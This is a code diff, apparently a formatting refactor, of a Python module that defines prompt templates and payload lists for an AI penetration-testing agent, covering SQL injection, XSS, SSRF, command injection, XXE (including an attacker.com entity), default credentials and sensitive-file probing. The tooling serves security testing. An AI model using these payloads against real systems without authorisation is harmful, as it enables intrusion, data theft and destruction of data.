@@ -6,10 +6,10 @@ Jinja2-based prompt templates for AI security testing.
 Includes vulnerability-specific expertise prompts and testing methodologies.
 """
 
-from pathlib import Path
-from typing import Dict, List, Optional, Any
-from dataclasses import dataclass, field
 import json
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Any, Dict, List, Optional
 
 from jinja2 import Environment, FileSystemLoader, select_autoescape
 
@@ -17,6 +17,7 @@ from jinja2 import Environment, FileSystemLoader, select_autoescape
 @dataclass
 class VulnerabilityPrompt:
     """A vulnerability-specific testing prompt."""
+
     id: str
     name: str
     category: str
@@ -40,27 +41,42 @@ def _register_vuln_prompt(prompt: VulnerabilityPrompt) -> None:
 
 
 # SQL Injection Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="sqli",
-    name="SQL Injection",
-    category="injection",
-    description="Test for SQL injection vulnerabilities in all input vectors",
-    owasp_category="A03:2021-Injection",
-    cwe_ids=["CWE-89", "CWE-564"],
-    testing_techniques=[
-        "Error-based SQLi", "Union-based SQLi", "Blind boolean SQLi",
-        "Time-based blind SQLi", "Out-of-band SQLi", "Second-order SQLi"
-    ],
-    payloads=[
-        "' OR '1'='1", "'; DROP TABLE--", "1' AND '1'='1",
-        "' UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:5'--",
-        "' OR SLEEP(5)#", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
-    ],
-    detection_patterns=[
-        "SQL syntax error", "mysql_fetch", "ORA-", "PostgreSQL",
-        "SQLite", "JDBC", "ODBC", "unclosed quotation"
-    ],
-    system_prompt="""You are an expert SQL injection penetration tester. Your mission is to discover and exploit SQL injection vulnerabilities in the target application.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="sqli",
+        name="SQL Injection",
+        category="injection",
+        description="Test for SQL injection vulnerabilities in all input vectors",
+        owasp_category="A03:2021-Injection",
+        cwe_ids=["CWE-89", "CWE-564"],
+        testing_techniques=[
+            "Error-based SQLi",
+            "Union-based SQLi",
+            "Blind boolean SQLi",
+            "Time-based blind SQLi",
+            "Out-of-band SQLi",
+            "Second-order SQLi",
+        ],
+        payloads=[
+            "' OR '1'='1",
+            "'; DROP TABLE--",
+            "1' AND '1'='1",
+            "' UNION SELECT NULL--",
+            "1; WAITFOR DELAY '0:0:5'--",
+            "' OR SLEEP(5)#",
+            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+        ],
+        detection_patterns=[
+            "SQL syntax error",
+            "mysql_fetch",
+            "ORA-",
+            "PostgreSQL",
+            "SQLite",
+            "JDBC",
+            "ODBC",
+            "unclosed quotation",
+        ],
+        system_prompt="""You are an expert SQL injection penetration tester. Your mission is to discover and exploit SQL injection vulnerabilities in the target application.
 
 EXPERTISE:
 - In-band SQLi (Error-based, Union-based)
@@ -91,32 +107,46 @@ When you find a vulnerability, report it as:
 </finding>
 
 Be thorough and test systematically. Do not stop until all input vectors have been tested.""",
-    user_prompt_template="Test {{ target }} for SQL injection vulnerabilities. Focus on {{ focus_area if focus_area else 'all input vectors' }}."
-))
+        user_prompt_template="Test {{ target }} for SQL injection vulnerabilities. Focus on {{ focus_area if focus_area else 'all input vectors' }}.",
+    )
+)
 
 
 # Cross-Site Scripting Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="xss",
-    name="Cross-Site Scripting",
-    category="injection",
-    description="Test for XSS vulnerabilities including reflected, stored, and DOM-based",
-    owasp_category="A03:2021-Injection",
-    cwe_ids=["CWE-79", "CWE-80"],
-    testing_techniques=[
-        "Reflected XSS", "Stored XSS", "DOM-based XSS",
-        "Mutation XSS", "Blind XSS", "Self-XSS to escalation"
-    ],
-    payloads=[
-        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'",
-        "<details open ontoggle=alert(1)>", "{{constructor.constructor('alert(1)')()}}"
-    ],
-    detection_patterns=[
-        "reflected in response", "script execution", "event handler triggered",
-        "DOM manipulation", "innerHTML", "document.write"
-    ],
-    system_prompt="""You are an expert XSS penetration tester specializing in discovering Cross-Site Scripting vulnerabilities.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="xss",
+        name="Cross-Site Scripting",
+        category="injection",
+        description="Test for XSS vulnerabilities including reflected, stored, and DOM-based",
+        owasp_category="A03:2021-Injection",
+        cwe_ids=["CWE-79", "CWE-80"],
+        testing_techniques=[
+            "Reflected XSS",
+            "Stored XSS",
+            "DOM-based XSS",
+            "Mutation XSS",
+            "Blind XSS",
+            "Self-XSS to escalation",
+        ],
+        payloads=[
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "javascript:alert(1)",
+            "'-alert(1)-'",
+            "<details open ontoggle=alert(1)>",
+            "{{constructor.constructor('alert(1)')()}}",
+        ],
+        detection_patterns=[
+            "reflected in response",
+            "script execution",
+            "event handler triggered",
+            "DOM manipulation",
+            "innerHTML",
+            "document.write",
+        ],
+        system_prompt="""You are an expert XSS penetration tester specializing in discovering Cross-Site Scripting vulnerabilities.
 
 EXPERTISE:
 - Reflected XSS (GET/POST parameters, headers, URL fragments)
@@ -148,31 +178,40 @@ When you find a vulnerability, report it as:
 </finding>
 
 Test all input vectors systematically. Consider encoding bypass techniques.""",
-    user_prompt_template="Test {{ target }} for XSS vulnerabilities. Focus on {{ focus_area if focus_area else 'all reflection points' }}."
-))
+        user_prompt_template="Test {{ target }} for XSS vulnerabilities. Focus on {{ focus_area if focus_area else 'all reflection points' }}.",
+    )
+)
 
 
 # Broken Access Control Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="idor",
-    name="Insecure Direct Object Reference",
-    category="access_control",
-    description="Test for IDOR and broken access control vulnerabilities",
-    owasp_category="A01:2021-Broken-Access-Control",
-    cwe_ids=["CWE-639", "CWE-284", "CWE-285"],
-    testing_techniques=[
-        "Horizontal privilege escalation", "Vertical privilege escalation",
-        "Parameter tampering", "Forced browsing", "API endpoint enumeration"
-    ],
-    payloads=[
-        "Change user ID in request", "Modify object reference",
-        "Access other users' resources", "Skip authorization checks"
-    ],
-    detection_patterns=[
-        "Different user data returned", "Access granted without authorization",
-        "Resource belonging to other user", "Missing access control"
-    ],
-    system_prompt="""You are an expert in discovering Broken Access Control and IDOR vulnerabilities.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="idor",
+        name="Insecure Direct Object Reference",
+        category="access_control",
+        description="Test for IDOR and broken access control vulnerabilities",
+        owasp_category="A01:2021-Broken-Access-Control",
+        cwe_ids=["CWE-639", "CWE-284", "CWE-285"],
+        testing_techniques=[
+            "Horizontal privilege escalation",
+            "Vertical privilege escalation",
+            "Parameter tampering",
+            "Forced browsing",
+            "API endpoint enumeration",
+        ],
+        payloads=[
+            "Change user ID in request",
+            "Modify object reference",
+            "Access other users' resources",
+            "Skip authorization checks",
+        ],
+        detection_patterns=[
+            "Different user data returned",
+            "Access granted without authorization",
+            "Resource belonging to other user",
+            "Missing access control",
+        ],
+        system_prompt="""You are an expert in discovering Broken Access Control and IDOR vulnerabilities.
 
 EXPERTISE:
 - Horizontal Privilege Escalation (accessing other users' data)
@@ -204,30 +243,37 @@ When you find a vulnerability, report it as:
 </finding>
 
 Test with multiple user roles and contexts.""",
-    user_prompt_template="Test {{ target }} for IDOR and broken access control. {{ 'User credentials: ' + credentials if credentials else '' }}"
-))
+        user_prompt_template="Test {{ target }} for IDOR and broken access control. {{ 'User credentials: ' + credentials if credentials else '' }}",
+    )
+)
 
 
 # Authentication Bypass Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="auth",
-    name="Authentication Bypass",
-    category="authentication",
-    description="Test for authentication vulnerabilities and bypass techniques",
-    owasp_category="A07:2021-Auth-Failures",
-    cwe_ids=["CWE-287", "CWE-288", "CWE-306"],
-    testing_techniques=[
-        "Credential stuffing", "Brute force", "Password reset flaws",
-        "Session fixation", "JWT attacks", "OAuth/OIDC flaws"
-    ],
-    payloads=[
-        "admin:admin", "test:test", "user:password", "admin:password123"
-    ],
-    detection_patterns=[
-        "Login successful", "Session created", "JWT token issued",
-        "Password reset sent", "Account unlocked"
-    ],
-    system_prompt="""You are an expert in authentication security testing.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="auth",
+        name="Authentication Bypass",
+        category="authentication",
+        description="Test for authentication vulnerabilities and bypass techniques",
+        owasp_category="A07:2021-Auth-Failures",
+        cwe_ids=["CWE-287", "CWE-288", "CWE-306"],
+        testing_techniques=[
+            "Credential stuffing",
+            "Brute force",
+            "Password reset flaws",
+            "Session fixation",
+            "JWT attacks",
+            "OAuth/OIDC flaws",
+        ],
+        payloads=["admin:admin", "test:test", "user:password", "admin:password123"],
+        detection_patterns=[
+            "Login successful",
+            "Session created",
+            "JWT token issued",
+            "Password reset sent",
+            "Account unlocked",
+        ],
+        system_prompt="""You are an expert in authentication security testing.
 
 EXPERTISE:
 - Credential testing and default passwords
@@ -261,32 +307,44 @@ When you find a vulnerability, report it as:
 </finding>
 
 Be thorough but avoid causing account lockouts in production.""",
-    user_prompt_template="Test authentication security on {{ target }}. {{ 'Test credentials: ' + credentials if credentials else '' }}"
-))
+        user_prompt_template="Test authentication security on {{ target }}. {{ 'Test credentials: ' + credentials if credentials else '' }}",
+    )
+)
 
 
 # Server-Side Request Forgery Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="ssrf",
-    name="Server-Side Request Forgery",
-    category="injection",
-    description="Test for SSRF vulnerabilities to access internal resources",
-    owasp_category="A10:2021-SSRF",
-    cwe_ids=["CWE-918"],
-    testing_techniques=[
-        "Basic SSRF", "Blind SSRF", "SSRF via DNS rebinding",
-        "SSRF to cloud metadata", "SSRF protocol smuggling"
-    ],
-    payloads=[
-        "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
-        "http://[::1]", "http://0.0.0.0", "file:///etc/passwd",
-        "http://metadata.google.internal", "http://instance-data"
-    ],
-    detection_patterns=[
-        "Internal response returned", "Cloud metadata accessed",
-        "Local file read", "Internal port scan results"
-    ],
-    system_prompt="""You are an expert SSRF penetration tester.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="ssrf",
+        name="Server-Side Request Forgery",
+        category="injection",
+        description="Test for SSRF vulnerabilities to access internal resources",
+        owasp_category="A10:2021-SSRF",
+        cwe_ids=["CWE-918"],
+        testing_techniques=[
+            "Basic SSRF",
+            "Blind SSRF",
+            "SSRF via DNS rebinding",
+            "SSRF to cloud metadata",
+            "SSRF protocol smuggling",
+        ],
+        payloads=[
+            "http://127.0.0.1",
+            "http://localhost",
+            "http://169.254.169.254",
+            "http://[::1]",
+            "http://0.0.0.0",
+            "file:///etc/passwd",
+            "http://metadata.google.internal",
+            "http://instance-data",
+        ],
+        detection_patterns=[
+            "Internal response returned",
+            "Cloud metadata accessed",
+            "Local file read",
+            "Internal port scan results",
+        ],
+        system_prompt="""You are an expert SSRF penetration tester.
 
 EXPERTISE:
 - Basic SSRF exploitation
@@ -319,31 +377,47 @@ OUTPUT FORMAT:
 <remediation>Input validation and allowlist approach</remediation>
 <cwe>CWE-918</cwe>
 </finding>""",
-    user_prompt_template="Test {{ target }} for SSRF vulnerabilities. Check for access to internal resources and cloud metadata."
-))
+        user_prompt_template="Test {{ target }} for SSRF vulnerabilities. Check for access to internal resources and cloud metadata.",
+    )
+)
 
 
 # Remote Code Execution Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="rce",
-    name="Remote Code Execution",
-    category="injection",
-    description="Test for RCE vulnerabilities including command injection and deserialization",
-    owasp_category="A03:2021-Injection",
-    cwe_ids=["CWE-78", "CWE-94", "CWE-502"],
-    testing_techniques=[
-        "OS command injection", "Code injection", "Template injection",
-        "Deserialization attacks", "File upload to RCE"
-    ],
-    payloads=[
-        "; id", "| id", "` id `", "$(id)", "; sleep 5",
-        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"
-    ],
-    detection_patterns=[
-        "uid=", "root:", "command output", "sleep delay",
-        "49", "template evaluated"
-    ],
-    system_prompt="""You are an expert RCE penetration tester specializing in command injection and code execution.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="rce",
+        name="Remote Code Execution",
+        category="injection",
+        description="Test for RCE vulnerabilities including command injection and deserialization",
+        owasp_category="A03:2021-Injection",
+        cwe_ids=["CWE-78", "CWE-94", "CWE-502"],
+        testing_techniques=[
+            "OS command injection",
+            "Code injection",
+            "Template injection",
+            "Deserialization attacks",
+            "File upload to RCE",
+        ],
+        payloads=[
+            "; id",
+            "| id",
+            "` id `",
+            "$(id)",
+            "; sleep 5",
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>",
+            "#{7*7}",
+        ],
+        detection_patterns=[
+            "uid=",
+            "root:",
+            "command output",
+            "sleep delay",
+            "49",
+            "template evaluated",
+        ],
+        system_prompt="""You are an expert RCE penetration tester specializing in command injection and code execution.
 
 EXPERTISE:
 - OS Command Injection (semicolon, pipe, backtick, $())
@@ -375,32 +449,39 @@ OUTPUT FORMAT:
 <remediation>Input sanitization and avoiding dangerous functions</remediation>
 <cwe>CWE-78</cwe>
 </finding>""",
-    user_prompt_template="Test {{ target }} for remote code execution vulnerabilities. Check command injection, SSTI, and deserialization."
-))
+        user_prompt_template="Test {{ target }} for remote code execution vulnerabilities. Check command injection, SSTI, and deserialization.",
+    )
+)
 
 
 # XML External Entity Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="xxe",
-    name="XML External Entity",
-    category="injection",
-    description="Test for XXE vulnerabilities in XML parsers",
-    owasp_category="A05:2021-Security-Misconfiguration",
-    cwe_ids=["CWE-611"],
-    testing_techniques=[
-        "Classic XXE", "Blind XXE via OOB", "XXE to SSRF",
-        "XXE via file upload", "XXE in SOAP"
-    ],
-    payloads=[
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>',
-        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
-    ],
-    detection_patterns=[
-        "root:", "/etc/passwd content", "external entity resolved",
-        "DTD processed"
-    ],
-    system_prompt="""You are an expert XXE penetration tester.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="xxe",
+        name="XML External Entity",
+        category="injection",
+        description="Test for XXE vulnerabilities in XML parsers",
+        owasp_category="A05:2021-Security-Misconfiguration",
+        cwe_ids=["CWE-611"],
+        testing_techniques=[
+            "Classic XXE",
+            "Blind XXE via OOB",
+            "XXE to SSRF",
+            "XXE via file upload",
+            "XXE in SOAP",
+        ],
+        payloads=[
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
+        ],
+        detection_patterns=[
+            "root:",
+            "/etc/passwd content",
+            "external entity resolved",
+            "DTD processed",
+        ],
+        system_prompt="""You are an expert XXE penetration tester.
 
 EXPERTISE:
 - Classic XXE for file reading
@@ -427,27 +508,31 @@ OUTPUT FORMAT:
 <remediation>Disable external entities in XML parser</remediation>
 <cwe>CWE-611</cwe>
 </finding>""",
-    user_prompt_template="Test {{ target }} for XXE vulnerabilities in XML processing endpoints."
-))
+        user_prompt_template="Test {{ target }} for XXE vulnerabilities in XML processing endpoints.",
+    )
+)
 
 
 # Business Logic Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="business_logic",
-    name="Business Logic Flaws",
-    category="logic",
-    description="Test for business logic vulnerabilities and workflow bypasses",
-    owasp_category="A04:2021-Insecure-Design",
-    cwe_ids=["CWE-840", "CWE-841"],
-    testing_techniques=[
-        "Workflow bypass", "Race conditions", "Price manipulation",
-        "Coupon/discount abuse", "Negative quantity", "Feature abuse"
-    ],
-    payloads=[],
-    detection_patterns=[
-        "Unexpected state", "Invalid transition", "Business rule violated"
-    ],
-    system_prompt="""You are an expert in business logic vulnerability testing.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="business_logic",
+        name="Business Logic Flaws",
+        category="logic",
+        description="Test for business logic vulnerabilities and workflow bypasses",
+        owasp_category="A04:2021-Insecure-Design",
+        cwe_ids=["CWE-840", "CWE-841"],
+        testing_techniques=[
+            "Workflow bypass",
+            "Race conditions",
+            "Price manipulation",
+            "Coupon/discount abuse",
+            "Negative quantity",
+            "Feature abuse",
+        ],
+        payloads=[],
+        detection_patterns=["Unexpected state", "Invalid transition", "Business rule violated"],
+        system_prompt="""You are an expert in business logic vulnerability testing.
 
 EXPERTISE:
 - Workflow/state machine bypasses
@@ -483,32 +568,46 @@ OUTPUT FORMAT:
 <remediation>Business rule enforcement</remediation>
 <cwe>CWE-840</cwe>
 </finding>""",
-    user_prompt_template="Test {{ target }} for business logic vulnerabilities. Focus on {{ focus_area if focus_area else 'critical workflows' }}."
-))
+        user_prompt_template="Test {{ target }} for business logic vulnerabilities. Focus on {{ focus_area if focus_area else 'critical workflows' }}.",
+    )
+)
 
 
 # Information Disclosure Expert
-_register_vuln_prompt(VulnerabilityPrompt(
-    id="info_disclosure",
-    name="Information Disclosure",
-    category="information",
-    description="Test for sensitive information exposure",
-    owasp_category="A01:2021-Broken-Access-Control",
-    cwe_ids=["CWE-200", "CWE-209", "CWE-532"],
-    testing_techniques=[
-        "Error message analysis", "Source code disclosure",
-        "Backup file discovery", "Debug endpoint discovery",
-        "API documentation exposure"
-    ],
-    payloads=[
-        ".git/HEAD", ".env", "web.config", "phpinfo.php",
-        ".DS_Store", "backup.sql", "debug", "trace"
-    ],
-    detection_patterns=[
-        "Stack trace", "Internal path", "Database credentials",
-        "API key", "Password", "Secret"
-    ],
-    system_prompt="""You are an expert in information disclosure vulnerability testing.
+_register_vuln_prompt(
+    VulnerabilityPrompt(
+        id="info_disclosure",
+        name="Information Disclosure",
+        category="information",
+        description="Test for sensitive information exposure",
+        owasp_category="A01:2021-Broken-Access-Control",
+        cwe_ids=["CWE-200", "CWE-209", "CWE-532"],
+        testing_techniques=[
+            "Error message analysis",
+            "Source code disclosure",
+            "Backup file discovery",
+            "Debug endpoint discovery",
+            "API documentation exposure",
+        ],
+        payloads=[
+            ".git/HEAD",
+            ".env",
+            "web.config",
+            "phpinfo.php",
+            ".DS_Store",
+            "backup.sql",
+            "debug",
+            "trace",
+        ],
+        detection_patterns=[
+            "Stack trace",
+            "Internal path",
+            "Database credentials",
+            "API key",
+            "Password",
+            "Secret",
+        ],
+        system_prompt="""You are an expert in information disclosure vulnerability testing.
 
 EXPERTISE:
 - Verbose error message analysis
@@ -543,8 +642,9 @@ OUTPUT FORMAT:
 <remediation>How to prevent the disclosure</remediation>
 <cwe>CWE-200</cwe>
 </finding>""",
-    user_prompt_template="Test {{ target }} for information disclosure vulnerabilities. Check for exposed configuration, errors, and sensitive files."
-))
+        user_prompt_template="Test {{ target }} for information disclosure vulnerabilities. Check for exposed configuration, errors, and sensitive files.",
+    )
+)
 
 
 class SkillPrompts:
@@ -561,7 +661,7 @@ class SkillPrompts:
         if custom_prompts_dir and custom_prompts_dir.exists():
             self._env = Environment(
                 loader=FileSystemLoader(str(custom_prompts_dir)),
-                autoescape=select_autoescape(['html', 'xml'])
+                autoescape=select_autoescape(["html", "xml"]),
             )
 
     def get_prompt(self, prompt_id: str) -> Optional[VulnerabilityPrompt]:
@@ -581,12 +681,7 @@ class SkillPrompts:
         prompt = self.get_prompt(prompt_id)
         return prompt.system_prompt if prompt else ""
 
-    def render_user_prompt(
-        self,
-        prompt_id: str,
-        target: str,
-        **kwargs
-    ) -> str:
+    def render_user_prompt(self, prompt_id: str, target: str, **kwargs) -> str:
         """Render a user prompt template with variables."""
         prompt = self.get_prompt(prompt_id)
         if not prompt:
@@ -594,15 +689,11 @@ class SkillPrompts:
 
         # Use Jinja2 to render the template
         from jinja2 import Template
+
         template = Template(prompt.user_prompt_template)
         return template.render(target=target, **kwargs)
 
-    def get_combined_prompt(
-        self,
-        prompt_ids: List[str],
-        target: str,
-        **kwargs
-    ) -> str:
+    def get_combined_prompt(self, prompt_ids: List[str], target: str, **kwargs) -> str:
         """Combine multiple vulnerability prompts into one comprehensive prompt."""
         prompts = [self.get_prompt(pid) for pid in prompt_ids if self.get_prompt(pid)]
 
